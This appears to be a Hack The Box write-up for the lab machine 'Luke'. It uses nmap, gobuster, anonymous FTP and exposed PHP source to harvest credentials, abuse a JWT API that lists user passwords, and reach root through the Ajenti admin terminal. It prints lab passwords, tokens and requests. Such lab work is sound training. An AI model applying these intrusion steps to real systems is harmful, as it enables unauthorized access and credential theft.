---
layout: single
title: Luke - Hack The Box
excerpt: "TBA"
date: 2019-12-31
classes: wide
header:
  teaser: /assets/images/htb-writeup-luke/luke_logo.png
categories:
  - hackthebox
  - infosec
tags:
  -
---

![](/assets/images/htb-writeup-luke/luke_logo.png)

TBA

## Summary

- In anonymous FTP, find a hint about obtaining source file for web application
- Find `.phps` file for the configuration of the web application and get a set of credentials
- Use those credentials to authentication to the API app on port 3000
- List users with their password
- Find `/management` link on main page that requires basic HTTP auth, log in using `Derry` user credentials
- Get root's password from the `config.json`
- Log in as root on the Ajenti admin panel, then spawn a terminal window and retrieve the flags

## Tools/Blogs used

- Nothing to report

## Detailed steps

### Portscan

```
# nmap -p- 10.10.10.137
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-26 16:39 EDT
Nmap scan report for luke.htb (10.10.10.137)
Host is up (0.021s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
8000/tcp open  http-alt
```

### FTP enumeration

Anonymous FTP is enabled and I found a single file: `for_Chihiro.txt`

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
226 Directory send OK.
ftp> cd webapp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
226 Directory send OK.
ftp> get for_Chihiro.txt
local: for_Chihiro.txt remote: for_Chihiro.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
226 Transfer complete.
306 bytes received in 0.00 secs (809.8323 kB/s)
```

The file contains contains a hint regarding source files for the website application.

```
# cat for_Chihiro.txt
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !

Derry
```

### Website enumeration

The site running on port 80 is just a generic site with no interactive component.

![](/assets/images/htb-writeup-luke/luke1.png)

While running gobuster I found a couple of interesting directories:

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -x php -u http://10.10.10.137

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.137/
[+] Threads      : 25
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes : 200,204,301,302,307,401,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/05/26 16:37:40 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/LICENSE (Status: 200)
/config.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/login.php (Status: 200)
/management (Status: 401)
/member (Status: 301)
/vendor (Status: 301)
=====================================================
2019/05/26 16:38:20 Finished
=====================================================
```

`/management` expects HTTP basic auth and I don't have the password yet. I'll keep that in mind and come back to it later when I find the credentials.

![](/assets/images/htb-writeup-luke/management1.png)

`/login.php` shows a login page for some PHP web application.

![](/assets/images/htb-writeup-luke/login1.png)

I tried a few sets of credentials and I wasn't able to log in. A quick run with SQLmap didn't reveal any easy SQL injection point either.

The hint from the FTP file talked about source files so did another dirbut pass using `.phps` as the extension:

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -x phps -u http://10.10.10.137
/config.phps (Status: 200)
/login.phps (Status: 200)
```

The `config.phps` contains the root credentials for MySQL

```
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

The `login.phps` file shows that the web application is incomplete. We're probably just meant to find the password from the `config.phps`.

### NodeJS app

The application running on port 3000 expects a JWT token in the Authorization header.

![](/assets/images/htb-writeup-luke/json1.png)

I dirbursted the site to find API endpoint and found the following:

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -u http://10.10.10.137:3000

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.137:3000/
[+] Threads      : 25
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes : 200,204,301,302,307,401,403
[+] Timeout      : 10s
=====================================================
2019/05/26 16:41:36 Starting gobuster
=====================================================
/Login (Status: 200)
/login (Status: 200)
/users (Status: 200)
=====================================================
2019/05/26 16:41:55 Finished
=====================================================
```

I can't reach `/users` because it expects an authorization header:

```
{"success":false,"message":"Auth token is not supplied"}
```

I can log in and get a token with the following POST request;

```
POST /Login HTTP/1.1
Host: 10.10.10.137:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: session=37be3eb0c4af11edb62b963b6103ded978568661
Connection: close
Content-Type: application/json
Content-Length: 52

{"username":"admin",
"password":"Zk6heYCyv6ZE9Xcg"}
```

I get an authentication token back:

```
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4ODg5NzM0LCJleHAiOjE1NTg5NzYxMzR9.hW8fCbdZ2S9L691y_OG5Kr0Bt2598JYjDlqLVrcOlj4"}
```

To authenticate, I add the following header to the GET request on `/` and `/users`:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4ODg5NzM0LCJleHAiOjE1NTg5NzYxMzR9.hW8fCbdZ2S9L691y_OG5Kr0Bt2598JYjDlqLVrcOlj4
```

On `GET /`, I now get `{"message":"Welcome admin ! "}`

`GET /users` shows a list of users:

```
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```

We can query each individual user with `GET /users/username and it returns their password:

```
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
{"name":"Yuri","password":"bet@tester87"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```

### Management page

I tried those credentials and found that I can log into the `/management` page with `Derry` (username is case sensitive)

![](/assets/images/htb-writeup-luke/management2.png)

`config.php` and `login.php` contain the source we already have but `config.json` contains another set of credentials:

![](/assets/images/htb-writeup-luke/config.png)

Password: `KpMasng6S5EtTy9Z`

### Ajenti

The Ajenti server admin panel runs on port 8000

![](/assets/images/htb-writeup-luke/ajenti1.png)

I can log in with `root` and `KpMasng6S5EtTy9Z`.

![](/assets/images/htb-writeup-luke/ajenti2.png)

Using the Terminal menu under Tools, I can get a shell and since I'm already running as root I can grab both flags

![](/assets/images/htb-writeup-luke/flag.png)